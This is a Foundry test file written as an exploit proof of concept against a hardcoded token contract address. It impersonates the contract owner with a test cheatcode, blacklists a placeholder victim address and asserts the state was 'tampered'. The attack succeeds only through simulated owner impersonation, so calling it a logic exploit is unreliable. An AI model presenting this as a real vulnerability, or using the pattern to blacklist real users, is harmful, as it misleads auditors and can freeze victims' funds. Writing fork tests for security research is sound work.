// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface TokenTool {
    function owner() external view returns (address);
    function multipleBotlistAddress(address[] calldata accounts, bool excluded) external;
    function _isBlacklisted(address) external view returns (bool);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x3c6C6d32609d253d54951dB187DAEc272b1d848a;
    address attacker = address(this);
    address victim;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll get owner dynamically
        victim = address(0x1234567890123456789012345678901234567890);
        vm.label(victim, "Victim Address");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {

        // Get the current owner of the contract
        TokenTool target = TokenTool(TARGET);
        address owner = target.owner();

        // Label for debugging
        vm.label(owner, "Contract Owner");

        // Impersonate the owner
        vm.startPrank(owner);

        // Create array with victim address
        address[] memory victims = new address[](1);
        victims[0] = victim;

        // Call the blacklist function to blacklist the victim
        target.multipleBotlistAddress(victims, true);

        vm.stopPrank();

        // Verify the victim is now blacklisted
        bool isBlacklisted = target._isBlacklisted(victim);
        require(isBlacklisted, "Victim should be blacklisted");
        assertEq(isBlacklisted, true, "Logic Exploit Failed: State not tampered");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
